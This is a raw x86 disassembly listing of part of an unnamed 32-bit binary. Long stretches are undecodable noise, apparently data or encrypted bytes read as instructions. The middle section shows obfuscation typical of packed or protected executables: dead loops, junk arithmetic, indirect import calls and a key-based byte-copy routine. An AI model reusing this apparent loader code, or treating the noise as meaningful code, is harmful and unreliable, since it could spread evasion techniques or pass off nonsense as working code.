  403957:	std    
  403958:	push   esi
  403959:	jmp    0x36ee82d6
  40395e:	imul   ecx,DWORD PTR [ebp+0x19],0x7
  403962:	push   ss
  403963:	fwait
  403964:	push   edi
  403965:	lock dec edi
  403967:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403968:	in     al,dx
  403969:	mov    eax,ds:0xe4d3a7b9
  40396e:	mov    ebp,0x1d440f77
  403973:	xchg   ebp,eax
  403974:	js     0x403960
  403976:	mov    al,ds:0xfeda3057
  40397b:	mov    ds:0x4d0dd37e,eax
  403980:	pop    esp
  403981:	jnp    0x403906
  403983:	leave  
  403984:	hlt    
  403985:	xchg   DWORD PTR [edx+0x4e],eax
  403988:	rcl    BYTE PTR [esi+0x5b],0x8b
  40398c:	or     DWORD PTR [eax-0x64cfbf96],ebx
  403992:	out    dx,eax
  403993:	add    eax,0x86708dba
  403998:	mov    ebp,0x39a972da
  40399d:	fidiv  WORD PTR [edx-0x10]
  4039a0:	mov    esp,0x6b11f721
  4039a5:	push   esi
  4039a6:	fmul   st,st(3)
  4039a8:	loope  0x403a0e
  4039aa:	pop    es
  4039ab:	jge    0x4039d2
  4039ad:	mov    ds:0xeba0318,al
  4039b2:	cmp    al,0x14
  4039b4:	inc    esp
  4039b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039b6:	pop    esp
  4039b7:	aad    0x1c
  4039b9:	lods   al,BYTE PTR ds:[esi]
  4039ba:	stc    
  4039bb:	xor    DWORD PTR [eax],0x16e57eac
  4039c1:	fistp  DWORD PTR [eax]
  4039c3:	in     eax,dx
  4039c4:	pop    ebx
  4039c5:	push   ds
  4039c6:	sbb    DWORD PTR [eax+0x69],0x6b
  4039ca:	rcr    bl,1
  4039cc:	dec    eax
  4039cd:	jbe    0x40397a
  4039cf:	sub    BYTE PTR [eax+0x63],ah
  4039d2:	fld    DWORD PTR [eax]
  4039d4:	lahf   
  4039d5:	cmp    eax,0xfaeeb5bc
  4039da:	and    DWORD PTR [esi-0x4d],edi
  4039dd:	sti    
  4039de:	mov    WORD PTR [edx+0x6b560df1],?
  4039e4:	retf   
  4039e5:	fwait
  4039e6:	push   ebp
  4039e7:	pop    eax
  4039e8:	shl    bl,0x45
  4039eb:	jb     0x403a03
  4039ed:	or     ah,BYTE PTR [ecx]
  4039ef:	cmp    DWORD PTR [eax+0x3b],esp
  4039f2:	scas   al,BYTE PTR es:[edi]
  4039f3:	and    cl,BYTE PTR [eax]
  4039f5:	out    dx,al
  4039f6:	sub    ch,BYTE PTR [ebp-0x6]
  4039f9:	add    BYTE PTR [esi],0xce
  4039fc:	xchg   ecx,eax
  4039fd:	push   0xf16fd425
  403a02:	jl     0x403a3f
  403a04:	cmp    eax,DWORD PTR [ebx+0x749a98c2]
  403a0a:	retf   0x1da
  403a0d:	inc    eax
  403a0e:	into   
  403a0f:	xchg   ebx,eax
  403a10:	clc    
  403a11:	mov    ch,0xff
  403a13:	fldcw  WORD PTR ds:0xdfa0745c
  403a19:	jg     0x4039eb
  403a1b:	push   edx
  403a1c:	imul   esi,eax,0xffffffb2
  403a1f:	cmp    eax,0xcb99386b
  403a24:	data16 sub bh,bh
  403a27:	jecxz  0x403a54
  403a29:	cli    
  403a2a:	inc    edx
  403a2b:	mov    esp,0x362d9dff
  403a30:	out    dx,al
  403a31:	mov    bl,0xca
  403a33:	and    esp,eax
  403a35:	cmp    edx,DWORD PTR [ebx]
  403a37:	fcom   DWORD PTR [edx+0x21]
  403a3a:	inc    edx
  403a3b:	mov    gs,esp
  403a3d:	add    ch,BYTE PTR ds:0x82f5fa64
  403a43:	push   ebp
  403a44:	fs ret 0xce9c
  403a48:	popa   
  403a49:	push   0x5
  403a4b:	dec    ebp
  403a4c:	sbb    BYTE PTR [eax+0x753fdb74],0x45
  403a53:	mov    cl,0xe3
  403a55:	dec    ebp
  403a56:	jnp    0x403ac4
  403a58:	push   ebp
  403a59:	xchg   esp,eax
  403a5a:	hlt    
  403a5b:	popf   
  403a5c:	or     eax,0xd3978834
  403a61:	fsubr  DWORD PTR [edx+eiz*4+0x63388732]
  403a68:	sbb    al,BYTE PTR [edx+0x2bfde1f]
  403a6e:	dec    eax
  403a6f:	lea    esp,[edx+0x57]
  403a72:	mov    dl,0xa6
  403a74:	(bad)  
  403a75:	sti    
  403a76:	xor    esi,DWORD PTR [eax+0x65a0c05d]
  403a7c:	nop
  403a7d:	scas   al,BYTE PTR es:[edi]
  403a7e:	es dec esp
  403a80:	ficom  WORD PTR [eax]
  403a82:	and    eax,0xb361348
  403a87:	sub    DWORD PTR [eax-0xb],edi
  403a8a:	je     0x403b01
  403a8c:	and    BYTE PTR cs:[ecx-0x35],0xbf
  403a91:	addr16 into 
  403a93:	and    ah,BYTE PTR [eax-0x1eb07a57]
  403a99:	pop    ebp
  403a9a:	xchg   ebx,eax
  403a9b:	push   esp
  403a9c:	jmp    0x2761:0x11ecab91
  403aa3:	fs mov ch,0x24
  403aa6:	loope  0x403b05
  403aa8:	hlt    
  403aa9:	and    bl,BYTE PTR [ebp+0x68ebe7fd]
  403aaf:	or     eax,0xbe94a784
  403ab4:	xor    bl,BYTE PTR [esi]
  403ab6:	xchg   DWORD PTR [edi],edx
  403ab8:	ret    
  403ab9:	test   DWORD PTR [eax-0x29],ecx
  403abc:	inc    DWORD PTR es:[esi+0x5a40779c]
  403ac3:	inc    edx
  403ac4:	and    BYTE PTR [eax-0xd],al
  403ac7:	ror    DWORD PTR [edi-0x63344f7e],0x9d
  403ace:	adc    edx,DWORD PTR ds:0x2d4de3f5
  403ad4:	jecxz  0x403a61
  403ad6:	mov    ebx,ss
  403ad8:	xchg   ecx,eax
  403ad9:	aaa    
  403ada:	jmp    0x403a64
  403adc:	sub    bl,BYTE PTR ds:0xe1e30dcf
  403ae2:	mov    ch,0xde
  403ae5:	call   0x7cbb:0x413516e9
  403aec:	rcr    BYTE PTR [ebp+0x7d7418a6],1
  403af2:	ins    DWORD PTR es:[edi],dx
  403af3:	mov    gs,edx
  403af5:	scas   al,BYTE PTR es:[edi]
  403af6:	cld    
  403af7:	fxch   st(4)
  403af9:	out    0xbc,eax
  403afb:	lds    esi,FWORD PTR [edi-0x41]
  403afe:	add    ecx,DWORD PTR [edx-0x7]
  403b01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b02:	or     esp,eax
  403b04:	jmp    0x403b09
  403b06:	pop    edi
  403b07:	scas   eax,DWORD PTR es:[edi]
  403b08:	std    
  403b09:	sbb    BYTE PTR [eax+0x4b770196],ah
  403b0f:	and    al,BYTE PTR [esi+0x46000564]
  403b15:	cmp    eax,DWORD PTR [eax-0x46]
  403b18:	pusha  
  403b19:	icebp  
  403b1a:	push   ss
  403b1b:	fs dec ebp
  403b1d:	adc    eax,0x4f50e91e
  403b22:	dec    edx
  403b23:	inc    edx
  403b24:	jecxz  0x403b94
  403b26:	or     BYTE PTR [ebp+0x2d73c84],bh
  403b2c:	daa    
  403b2d:	xchg   ebp,eax
  403b2e:	je     0x403baa
  403b30:	bound  edi,QWORD PTR [edx+edx*4-0x42f61783]
  403b37:	xchg   ecx,eax
  403b38:	stc    
  403b39:	ins    DWORD PTR es:[edi],dx
  403b3a:	sbb    al,0xee
  403b3c:	js     0x403b38
  403b3e:	mov    al,0x15
  403b40:	outs   dx,DWORD PTR ds:[esi]
  403b41:	mov    bh,0xe7
  403b43:	adc    eax,0x1513d9fb
  403b48:	pop    ecx
  403b49:	and    al,0xa9
  403b4b:	mov    dh,0x25
  403b4d:	pop    eax
  403b4e:	in     eax,0x60
  403b50:	xor    esi,DWORD PTR [edi-0x40]
  403b53:	inc    ecx
  403b54:	lahf   
  403b55:	add    DWORD PTR ds:0x331d09e0,0xb977a40e
  403b5f:	xchg   ebp,eax
  403b60:	mov    al,0x1e
  403b62:	cmp    bl,BYTE PTR [edi-0x87a9c8f]
  403b68:	lods   eax,DWORD PTR ds:[esi]
  403b69:	inc    ecx
  403b6a:	hlt    
  403b6b:	clc    
  403b6c:	inc    edi
  403b6d:	jmp    0x9ef9:0x4f2a557e
  403b74:	mov    ebp,0x414da9af
  403b79:	push   ds
  403b7a:	scas   al,BYTE PTR es:[edi]
  403b7b:	add    DWORD PTR [edi-0x49438bec],esp
  403b81:	in     eax,dx
  403b82:	jmp    0xf7bc01ff
  403b87:	mov    al,ds:0x6471491
  403b8c:	xchg   esi,eax
  403b8d:	pop    esi
  403b8e:	sahf   
  403b8f:	btc    DWORD PTR [edi],edx
  403b92:	fisubr DWORD PTR [eax+0x3e]
  403b95:	jo     0x403be4
  403b97:	test   al,0xfd
  403b99:	xchg   ecx,eax
  403b9a:	fadd   DWORD PTR [esi+edi*1-0x4f]
  403b9e:	adc    al,0x9c
  403ba0:	adc    al,0x97
  403ba2:	aas    
  403ba3:	mov    ebp,DWORD PTR [esi+0x2ffdfb73]
  403ba9:	aaa    
  403baa:	popf   
  403bab:	test   BYTE PTR ds:0x565835b7,ah
  403bb1:	out    0xe,al
  403bb3:	mov    fs,WORD PTR [esi+esi*1+0x49]
  403bb7:	adc    cl,BYTE PTR [edx]
  403bb9:	fnstsw WORD PTR ds:0x7d5fb019
  403bbf:	retf   
  403bc0:	add    ch,BYTE PTR [ebp-0x76]
  403bc3:	lea    esi,[esi-0x72]
  403bc6:	ins    BYTE PTR es:[edi],dx
  403bc7:	or     DWORD PTR ds:0x7cf04430,eax
  403bcd:	vpmulhuw ymm0,ymm6,ymm1
  403bd1:	or     BYTE PTR [ebp+eax*8+0x3d],cl
  403bd5:	jmp    0xdeec05c1
  403bda:	loopne 0x403c0a
  403bdc:	inc    esp
  403bdd:	adc    al,0x17
  403bdf:	repnz les edx,FWORD PTR [edi+edi*4+0x18]
  403be4:	aam    0x37
  403be6:	sub    bh,BYTE PTR cs:[esi-0x5eb84e1d]
  403bed:	sbb    eax,0x358c1557
  403bf2:	dec    ebp
  403bf3:	xor    eax,0x4ef93adb
  403bf8:	mov    eax,DWORD PTR [ebx+0x3f335416]
  403bfe:	fsub   QWORD PTR [ebp+0x75ca978c]
  403c04:	cmp    esi,DWORD PTR [esi]
  403c06:	push   ss
  403c07:	pop    eax
  403c08:	pop    ebx
  403c09:	push   ebx
  403c0a:	sub    DWORD PTR [ebx],esi
  403c0c:	jge    0x403c43
  403c0e:	xchg   esp,eax
  403c0f:	xor    al,0xb5
  403c11:	js     0x403c7a
  403c13:	popf   
  403c14:	(bad)  
  403c16:	leave  
  403c17:	mov    eax,0xef2e84de
  403c1c:	cli    
  403c1d:	mov    ds:0x1686c255,al
  403c22:	dec    ecx
  403c23:	outs   dx,BYTE PTR ds:[esi]
  403c24:	and    eax,0x26efce3b
  403c29:	call   0x18e8:0x53acdf5a
  403c30:	or     eax,0x66a996de
  403c35:	jg     0x403bd7
  403c37:	icebp  
  403c38:	scas   eax,DWORD PTR es:[edi]
  403c39:	add    eax,0x1b821846
  403c3e:	outs   dx,BYTE PTR ds:[esi]
  403c3f:	ret    0xacc4
  403c42:	ins    BYTE PTR es:[edi],dx
  403c43:	xchg   esp,eax
  403c44:	and    DWORD PTR [ecx-0x293300aa],eax
  403c4a:	cs push 0xdc3f9b72
  403c50:	(bad)
  403c53:	adc    esp,esi
  403c55:	or     al,0x29
  403c57:	imul   eax,edi,0xffffffd5
  403c5a:	cmp    al,0x1e
  403c5c:	sbb    BYTE PTR [ecx],dh
  403c5e:	cmp    al,0x9b
  403c60:	fld    QWORD PTR [ecx-0x2b759365]
  403c66:	sub    eax,0xea9f40e0
  403c6b:	cmc    
  403c6c:	push   ss
  403c6d:	dec    ebp
  403c6e:	mov    esp,0x99aaf872
  403c73:	rcl    BYTE PTR [edx+0x4f],1
  403c76:	jge    0x403bfc
  403c78:	push   esi
  403c79:	daa    
  403c7a:	das    
  403c7b:	sub    eax,0x724c653f
  403c80:	xor    ecx,eax
  403c82:	mov    DWORD PTR [ebp+0x8],ecx
  403c85:	mov    ecx,DWORD PTR [ebp+0x8]
  403c88:	mov    edx,DWORD PTR [ebp+0x8]
  403c8b:	xor    ecx,eax
  403c8d:	imul   edx,edx,0x5708f5
  403c93:	add    ecx,esi
  403c95:	lea    ecx,[ebp+ecx*4-0x64]
  403c99:	mov    edi,DWORD PTR [ecx]
  403c9b:	add    edx,edi
  403c9d:	mov    DWORD PTR [ecx],edx
  403c9f:	mov    ecx,DWORD PTR [ebp+0x8]
  403ca2:	xor    ecx,eax
  403ca4:	add    ecx,esi
  403ca6:	jne    0x4018ed
  403cac:	mov    ecx,DWORD PTR [ebp-0x8]
  403caf:	xor    ecx,eax
  403cb1:	mov    eax,DWORD PTR [ebp+0x10]
  403cb4:	add    ecx,esi
  403cb6:	mov    DWORD PTR [eax],ecx
  403cb8:	pop    edi
  403cb9:	pop    esi
  403cba:	pop    ebx
  403cbb:	leave  
  403cbc:	ret    0xc
  403cbf:	push   ebp
  403cc0:	mov    ebp,esp
  403cc2:	mov    DWORD PTR ds:0x41d4ec,0xf89c85b5
  403ccc:	pop    ebp
  403ccd:	mov    DWORD PTR ds:0x429000,0x2616
  403cd7:	jmp    0x41046f
  403cdc:	sbb    DWORD PTR ds:0x427018,edx
  403ce2:	mov    eax,0x80670b3f
  403ce7:	ret    
  403ce8:	push   ebp
  403ce9:	mov    ebp,esp
  403ceb:	sub    esp,0x10
  403cee:	mov    eax,0xf89c85b6
  403cf3:	mov    DWORD PTR ds:0x425004,0x1b
  403cfd:	cmp    DWORD PTR ds:0x425004,0x0
  403d04:	je     0x403d42
  403d0a:	cmp    DWORD PTR ds:0x425004,0x29
  403d11:	jne    0x403d26
  403d17:	push   DWORD PTR [ebp-0xc]
  403d1a:	push   DWORD PTR [ebp-0x1c]
  403d1d:	push   DWORD PTR [ebp-0x18]
  403d20:	call   DWORD PTR ds:0x421020
  403d26:	mov    edx,DWORD PTR ds:0x425004
  403d2c:	dec    edx
  403d2d:	mov    DWORD PTR ds:0x425004,edx
  403d33:	jmp    0x403cfd
  403d38:	xor    DWORD PTR ds:0x426018,0x7d7c
  403d42:	mov    DWORD PTR [ebp-0x4],eax
  403d45:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  403d4c:	and    DWORD PTR ds:0x428014,0x0
  403d56:	jmp    0x403d68
  403d5b:	mov    ecx,DWORD PTR ds:0x428014
  403d61:	inc    ecx
  403d62:	mov    DWORD PTR ds:0x428014,ecx
  403d68:	cmp    DWORD PTR ds:0x428014,0x1f
  403d6f:	jae    0x403db8
  403d75:	cmp    DWORD PTR ds:0x428014,0x4
  403d7c:	jne    0x403d93
  403d82:	push   DWORD PTR [ebp-0x18]
  403d85:	push   0x8961
  403d8a:	push   DWORD PTR [ebp-0x14]
  403d8d:	call   DWORD PTR ds:0x421028
  403d93:	cmp    DWORD PTR ds:0x428014,0x3
  403d9a:	jne    0x403dad
  403da0:	mov    ecx,DWORD PTR ds:0x428014
  403da6:	inc    ecx
  403da7:	mov    DWORD PTR ds:0x428014,ecx
  403dad:	jmp    0x403d5b
  403db2:	add    ecx,DWORD PTR ds:0x425000
  403db8:	mov    ecx,DWORD PTR [ebp-0x4]
  403dbb:	adc    DWORD PTR ds:0x426000,edi
  403dc1:	push   esi
  403dc2:	or     edx,esi
  403dc4:	mov    edx,0x7510893
  403dc9:	and    DWORD PTR ds:0x429014,0x0
  403dd3:	mov    esi,DWORD PTR ds:0x429014
  403dd9:	inc    esi
  403dda:	mov    DWORD PTR ds:0x429014,esi
  403de0:	cmp    DWORD PTR ds:0x429014,0x5
  403de7:	jne    0x403df8
  403ded:	push   0x41ff1f
  403df2:	call   DWORD PTR ds:0x42102c
  403df8:	cmp    DWORD PTR ds:0x429014,0x4
  403dff:	jne    0x403e12
  403e05:	mov    esi,DWORD PTR ds:0x429014
  403e0b:	inc    esi
  403e0c:	mov    DWORD PTR ds:0x429014,esi
  403e12:	cmp    DWORD PTR ds:0x429014,0x15
  403e19:	jb     0x403dd3
  403e1f:	movzx  esi,BYTE PTR ds:0x429008
  403e26:	sub    DWORD PTR ds:0x42900c,esi
  403e2c:	xor    ecx,edx
  403e2e:	mov    esi,0x3272db
  403e33:	push   edi
  403e34:	sbb    edi,DWORD PTR ds:0x42601c
  403e3a:	mov    edi,DWORD PTR [ebp+0x10]
  403e3d:	add    ecx,esi
  403e3f:	mov    DWORD PTR ds:0x42700c,0x23cb
  403e49:	cmp    ecx,edi
  403e4b:	mov    DWORD PTR ds:0x425000,0x3f40
  403e55:	je     0x403f20
  403e5b:	mov    ecx,DWORD PTR [ebp-0x4]
  403e5e:	sub    edi,0x7e0f
  403e64:	mov    edi,DWORD PTR [ebp+0x10]
  403e67:	xor    eax,eax
  403e69:	xor    ecx,edx
  403e6b:	add    ecx,esi
  403e6d:	add    edi,0xfabdbef1
  403e73:	adc    eax,0xffffffff
  403e76:	xor    eax,0x0
  403e79:	mov    DWORD PTR [ebp-0xc],eax
  403e7c:	push   ebx
  403e7d:	xor    ebx,ebx
  403e7f:	xor    edi,0x8a29a123
  403e85:	mov    eax,ecx
  403e87:	add    eax,0xfabdbef1
  403e8c:	adc    ebx,0xffffffff
  403e8f:	xor    eax,0x8a29a123
  403e94:	xor    ebx,0x0
  403e97:	cmp    eax,edi
  403e99:	jne    0x403eb2
  403e9f:	cmp    ebx,DWORD PTR [ebp-0xc]
  403ea2:	je     0x403f1a
  403ea8:	jmp    0x403eb2
  403ead:	mov    esi,0x3272db
  403eb2:	mov    eax,DWORD PTR [ebp-0x4]
  403eb5:	mov    edi,DWORD PTR [ebp-0x8]
  403eb8:	xor    edi,edx
  403eba:	add    edi,esi
  403ebc:	mov    esi,DWORD PTR [ebp+0x8]
  403ebf:	imul   edi,ecx
  403ec2:	mov    ebx,DWORD PTR [ebp+0xc]
  403ec5:	xor    eax,edx
  403ec7:	add    eax,ecx
  403ec9:	mov    al,BYTE PTR [ebx+eax*1+0x3272db]
  403ed0:	mov    BYTE PTR [edi+esi*1],al
  403ed3:	mov    eax,DWORD PTR [ebp-0x8]
  403ed6:	mov    esi,DWORD PTR [ebp+0x10]
  403ed9:	xor    eax,edx
  403edb:	xor    ebx,ebx
  403edd:	add    esi,0xfabdbef1
  403ee3:	adc    ebx,0xffffffff
  403ee6:	lea    ecx,[ecx+eax*1+0x3272db]
  403eed:	xor    edi,edi
  403eef:	xor    esi,0x8a29a123
  403ef5:	xor    ebx,0x0
  403ef8:	mov    eax,ecx
  403efa:	add    eax,0xfabdbef1
  403eff:	adc    edi,0xffffffff
  403f02:	xor    eax,0x8a29a123
  403f07:	xor    edi,0x0
  403f0a:	cmp    eax,esi
  403f0c:	jne    0x403ead
  403f12:	cmp    edi,ebx
  403f14:	jne    0x403ead
  403f1a:	mov    eax,0xf89c85b5
  403f1f:	pop    ebx
  403f20:	pop    edi
  403f21:	pop    esi
  403f22:	leave  
  403f23:	ret    0xc
  403f26:	push   ebp
  403f27:	mov    ebp,esp
  403f29:	sub    esp,0x78
  403f2c:	adc    DWORD PTR ds:0x42601c,0x7e2b
  403f36:	push   ebx
  403f37:	push   esi
  403f38:	push   edi
  403f39:	push   0x1f
  403f3b:	sub    DWORD PTR ds:0x42601c,0x56d8
  403f45:	lea    eax,[ebp-0x78]
  403f48:	sbb    DWORD PTR ds:0x42801c,0x71f8
  403f52:	push   eax
  403f53:	add    DWORD PTR ds:0x429018,0x427000
  403f5d:	push   0x0
  403f5f:	sub    DWORD PTR ds:0x42501c,0x427004
  403f69:	call   DWORD PTR ds:0x421044
  403f6f:	push   0x97898797
  403f74:	and    DWORD PTR ds:0x426000,0x1a8d
  403f7e:	call   DWORD PTR ds:0x421010
  403f84:	and    DWORD PTR ds:0x42600c,0x0
  403f8e:	mov    ecx,DWORD PTR ds:0x42600c
  403f94:	inc    ecx
  403f95:	mov    DWORD PTR ds:0x42600c,ecx
  403f9b:	cmp    DWORD PTR ds:0x42600c,0x21
  403fa2:	jne    0x403fda
  403fa8:	push   0x67f5
  403fad:	push   0x706e
  403fb2:	push   DWORD PTR [ebp-0x1c]
  403fb5:	push   0x21f9
  403fba:	push   DWORD PTR [ebp-0x24]
  403fbd:	push   0x372d
  403fc2:	push   DWORD PTR [ebp-0x1c]
  403fc5:	push   0x6932
  403fca:	push   0x2439
  403fcf:	push   0x1248
  403fd4:	call   DWORD PTR ds:0x421030
  403fda:	cmp    DWORD PTR ds:0x42600c,0x1d
  403fe1:	jb     0x403f8e
  403fe7:	add    DWORD PTR ds:0x428010,ebx
  403fed:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  403ff4:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  403ffb:	or     DWORD PTR ds:0x42701c,0x426014
  404005:	mov    ecx,DWORD PTR [ebp-0x4]
  404008:	adc    eax,0xdaa
  40400d:	mov    ebx,0x7510893
  404012:	xor    DWORD PTR ds:0x427004,ebx
  404018:	xor    ecx,ebx
  40401a:	mov    eax,0x3272db
  40401f:	add    ecx,eax
  404021:	mov    DWORD PTR [ebp-0x1c],ecx
  404024:	and    DWORD PTR ds:0x428010,0x0
  40402e:	jmp    0x404040
  404033:	mov    ecx,DWORD PTR ds:0x428010
  404039:	inc    ecx
  40403a:	mov    DWORD PTR ds:0x428010,ecx
  404040:	cmp    DWORD PTR ds:0x428010,0x18
  404047:	jae    0x40406f
  40404d:	cmp    DWORD PTR ds:0x428010,0x20
  404054:	jne    0x40406a
  40405a:	push   0x42801c
  40405f:	push   0x7111
  404064:	call   DWORD PTR ds:0x421058
  40406a:	jmp    0x404033
  40406f:	mov    ecx,DWORD PTR [ebp+0x14]
  404072:	adc    DWORD PTR ds:0x426004,0x3b44
  40407c:	test   ecx,ecx
  40407e:	mov    DWORD PTR ds:0x425024,0xafb
  404088:	je     0x404096
  40408e:	mov    ecx,DWORD PTR [ebp+0x14]
  404091:	mov    ecx,DWORD PTR [ecx]
  404093:	mov    DWORD PTR [ebp-0x1c],ecx
  404096:	mov    ecx,0x7665
  40409b:	imul   edx,eax
  40409e:	or     DWORD PTR ds:0x429000,0x5016
  4040a8:	mov    esi,0x76532
  4040ad:	sbb    DWORD PTR ds:0x429008,0x6d64
  4040b7:	add    edx,ecx
  4040b9:	xchg   esi,ecx
  4040bb:	or     esi,DWORD PTR ds:0x427010
  4040c1:	mov    edi,0x54354
  4040c6:	sub    edx,edi
  4040c8:	xor    DWORD PTR ds:0x42600c,edi
  4040ce:	mov    ecx,DWORD PTR [ebp-0x4]
  4040d1:	xor    DWORD PTR ds:0x425008,0x2961
  4040db:	xor    ecx,ebx
  4040dd:	mov    DWORD PTR ds:0x42601c,0x16
  4040e7:	cmp    DWORD PTR ds:0x42601c,0x0
  4040ee:	je     0x404130
  4040f4:	cmp    DWORD PTR ds:0x42601c,0x1d
  4040fb:	jne    0x404114
  404101:	push   0x425014
  404106:	push   0x426014
  40410b:	push   DWORD PTR [ebp-0x28]
  40410e:	call   DWORD PTR ds:0x42105c
  404114:	mov    esi,DWORD PTR ds:0x42601c
  40411a:	dec    esi
  40411b:	mov    DWORD PTR ds:0x42601c,esi
  404121:	jmp    0x4040e7
  404126:	sbb    DWORD PTR ds:0x425014,0x65a5
  404130:	add    ecx,eax
  404132:	mov    esi,DWORD PTR ds:0x425008
  404138:	sbb    DWORD PTR ds:0x426008,esi
  40413e:	mov    DWORD PTR [ebp-0x8],ecx
  404141:	sub    DWORD PTR ds:0x428010,edx
  404147:	mov    ecx,DWORD PTR [ebp-0x14]
  40414a:	mov    DWORD PTR ds:0x428008,0x2441
  404154:	xor    ecx,ebx
  404156:	add    ecx,eax
  404158:	mov    DWORD PTR [ebp-0x24],ecx
  40415b:	mov    ecx,DWORD PTR ds:0x42801c
  404161:	sbb    DWORD PTR ds:0x429004,ecx
  404167:	mov    ecx,DWORD PTR [ebp-0x4]
  40416a:	xor    ecx,ebx
  40416c:	mov    DWORD PTR ds:0x426000,0x1b
  404176:	cmp    DWORD PTR ds:0x426000,0x0
  40417d:	je     0x4041b9
  404183:	cmp    DWORD PTR ds:0x426000,0x22
  40418a:	jne    0x4041a3
  404190:	push   0x561f
  404195:	push   0x425014
  40419a:	push   DWORD PTR [ebp-0xc]
  40419d:	call   DWORD PTR ds:0x421034
  4041a3:	xor    esi,esi
  4041a5:	add    esi,DWORD PTR ds:0x426000
  4041ab:	dec    esi
  4041ac:	mov    DWORD PTR ds:0x426000,esi
  4041b2:	jmp    0x404176
  4041b7:	neg    esi
  4041b9:	add    ecx,eax
  4041bb:	adc    DWORD PTR ds:0x425014,edi
  4041c1:	mov    DWORD PTR [ebp-0x30],ecx
  4041c4:	or     DWORD PTR ds:0x426000,0x760b
  4041ce:	mov    esi,DWORD PTR [ebp-0x4]
  4041d1:	and    DWORD PTR ds:0x42700c,0x0
  4041db:	mov    ecx,DWORD PTR ds:0x42700c
  4041e1:	inc    ecx
  4041e2:	mov    DWORD PTR ds:0x42700c,ecx
  4041e8:	cmp    DWORD PTR ds:0x42700c,0x1f
  4041ef:	jne    0x404203
  4041f5:	push   DWORD PTR [ebp-0xc]
  4041f8:	push   0x7ec8
  4041fd:	call   DWORD PTR ds:0x421038
  404203:	cmp    DWORD PTR ds:0x42700c,0x13
  40420a:	jb     0x4041db
  404210:	xor    esi,ebx
  404212:	mov    DWORD PTR ds:0x426018,0x19
  40421c:	cmp    DWORD PTR ds:0x426018,0x0
  404223:	je     0x40427d
  404229:	cmp    DWORD PTR ds:0x426018,0xc
  404230:	jne    0x404251
  404236:	push   DWORD PTR [ebp-0x24]
  404239:	push   0x1686
  40423e:	push   0x428008
  404243:	push   DWORD PTR [ebp-0x28]
  404246:	push   0x2eb1
  40424b:	call   DWORD PTR ds:0x421000
  404251:	cmp    DWORD PTR ds:0x426018,0xd
  404258:	jne    0x40426b
  40425e:	mov    ecx,DWORD PTR ds:0x426018
  404264:	dec    ecx
  404265:	mov    DWORD PTR ds:0x426018,ecx
  40426b:	mov    ecx,DWORD PTR ds:0x426018
  404271:	dec    ecx
  404272:	mov    DWORD PTR ds:0x426018,ecx
  404278:	jmp    0x40421c
  40427d:	add    esi,eax
  40427f:	sub    DWORD PTR ds:0x428008,edx
  404285:	mov    ecx,DWORD PTR [ebp-0x24]
  404288:	or     DWORD PTR ds:0x429008,0x427008
  404292:	sub    ecx,eax
  404294:	jmp    0x4065e9
  404299:	div    ecx
  40429b:	and    DWORD PTR [edi+eax*1+0x64],edx
  40429f:	xchg   ebx,eax
  4042a0:	lods   eax,DWORD PTR ds:[esi]
  4042a1:	mov    edx,0xd99c947b
  4042a6:	push   ecx
  4042a7:	dec    ebp
  4042a8:	and    al,0x1a
  4042aa:	pop    edi
  4042ab:	bound  esp,QWORD PTR [edx+0x2a]
  4042ae:	pop    edi
  4042af:	bound  esp,QWORD PTR [edx-0x20]
  4042b2:	call   0x3faf:0xc47818db
  4042b9:	xchg   edi,eax
  4042ba:	loopne 0x4042cf
  4042bc:	sub    BYTE PTR [edx-0x23],dh
  4042bf:	in     eax,dx
  4042c0:	xor    DWORD PTR [ebx],eax
  4042c2:	jp     0x4042f7
  4042c4:	out    0x7a,eax
  4042c6:	test   bl,0x99
  4042c9:	in     al,dx
  4042ca:	sbb    BYTE PTR [ecx-0x21333d68],ah
  4042d0:	dec    eax
  4042d1:	mov    al,0xe6
  4042d3:	sbb    al,0x3d
  4042d5:	or     DWORD PTR [esi+0x5b],ecx
  4042d8:	push   edi
  4042d9:	push   ebp
  4042da:	aam    0xb1
  4042dc:	jg     0x4042c7
  4042de:	cwde   
  4042df:	data16 out dx,al
  4042e1:	ins    BYTE PTR es:[edi],dx
  4042e2:	ret    
  4042e3:	inc    ebx
  4042e4:	pop    ds
  4042e5:	push   ebx
  4042e6:	mov    ecx,0xeef1805a
  4042eb:	add    al,0x43
  4042ed:	push   eax
  4042ee:	sub    al,0xcb
  4042f0:	int    0xe0
  4042f2:	pop    esi
  4042f3:	ja     0x40429f
  4042f5:	cwde   
  4042f6:	or     eax,0x6f30f30c
  4042fb:	cmp    bl,BYTE PTR [ecx-0x39]
  4042fe:	outs   dx,BYTE PTR ds:[esi]
  4042ff:	jle    0x4042d9
  404301:	xor    edx,DWORD PTR ds:0x23707004
  404307:	mov    ?,WORD PTR [esi-0x2a]
  40430a:	fdiv   QWORD PTR [edi+eiz*2-0x5e]
  40430e:	popf   
  40430f:	dec    esi
  404310:	push   ecx
  404311:	mov    edi,0x4166984c
  404316:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404317:	gs or  cl,ch
  40431a:	inc    ecx
  40431b:	xor    dh,bh
  40431d:	mov    ah,0x61
  40431f:	dec    al
  404321:	arpl   cx,sp
  404323:	(bad)  
  404325:	pop    ss
  404326:	or     BYTE PTR [esp],dl
  404329:	rcl    DWORD PTR [esi],cl
  40432b:	arpl   bp,cx
  40432d:	or     ah,BYTE PTR [eax-0x31]
  404330:	dec    edx
  404331:	rcr    DWORD PTR [ecx],1
  404333:	add    edi,ecx
  404335:	cmp    ecx,DWORD PTR [eax+0x3b]
  404338:	idiv   DWORD PTR [edx]
  40433a:	mov    ebx,0x9ca85688
  40433f:	retf   0x6145
  404342:	push   ecx
  404343:	push   esp
  404344:	(bad)  
  404345:	retf   0x5c02
  404348:	or     bh,bl
  40434a:	fcmovnb st,st(7)
  40434c:	repz add BYTE PTR [ebx],dl
  40434f:	xchg   ebx,eax
  404350:	fild   QWORD PTR [edx-0x43]
  404353:	adc    eax,0xa83883ad
  404358:	sub    al,0x44
  40435a:	cmp    bh,BYTE PTR [ecx]
  40435c:	xor    DWORD PTR [esi-0x6ca9c2cf],edx
  404362:	xor    al,0xd6
  404364:	push   esi
  404365:	int3   
  404366:	bound  edx,QWORD PTR [esi-0x1048d69e]
  40436c:	clc    
  40436d:	pop    edx
  40436e:	pusha  
